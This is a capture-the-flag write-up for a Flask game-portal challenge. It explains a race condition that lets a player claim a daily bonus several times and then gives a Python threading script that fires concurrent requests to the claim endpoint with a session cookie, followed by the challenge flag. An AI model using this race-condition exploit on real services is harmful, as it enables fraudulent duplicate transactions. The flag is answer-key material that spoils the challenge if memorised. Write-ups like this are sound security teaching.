# Straightforward (Web) - 412

> Test out our game center. You'll have free claiming bonus for first timers!
> 
- `straightforward_player.zip` – Source Code

# Solution

### Examining the Website
On first glance, we're met with a *Game Portal* that allows us to register an account with a username. If the username is taken, the account will not be created.

![image1](https://github.com/user-attachments/assets/060bab54-b351-41a5-b30b-39fddb86fc71)

After creating an account, we're able to either claim a bonus of $1000, or redeem a secret prize for $3000. As you can only obtain a balance of $2000, it should be impossible to claim the prize within the day.

This largely hints at a race condition to be exploited, in which we can process the request twice by using more than one thread to claim the prize.

### Exploiting the Race Condition
To exploit this, we crafted a payload in Python using our session cookie that we obtained by examining the request in Burp Suite, or otherwise easily done by inspecting the webpage:

```python
import requests
import threading

HOST = "<http://159.69.219.192:7859>"
COOKIES = {"session": "eyJ1c2VybmFtZSI6ImVyciJ9.Z_ncIw.-ZLw2zIuPkPHYdADkl2BoLBMpzQ"}

def claim_money():
    response = requests.post(
        f"{HOST}/claim",
        cookies=COOKIES,
    )
    print(response.text)

threads = []
for _ in range(5):
    t = threading.Thread(target=claim_money)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### Buying the Flag
After running the payload, we'll see that we have enough in our balance to redeem the secret reward on `/buy_flag`.

![image2](https://github.com/user-attachments/assets/7d474ebf-3b8c-4894-8651-ca4f42d78bc4)

![image3](https://github.com/user-attachments/assets/a943b3fb-9898-4003-bc30-804fbf13afa0)

```
UMCS{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}
```

# Conclusion
This challenge involves a web application running on Flask where you can claim a daily reward of $1000 and buy a secret reward for $3000. The solution of this challenge is to exploit a pretty *straightforward* race condition within the app by crafting a Python payload that utilizes threading to claim the daily reward more than once. By doing this, we are able to successfully purchase the flag.
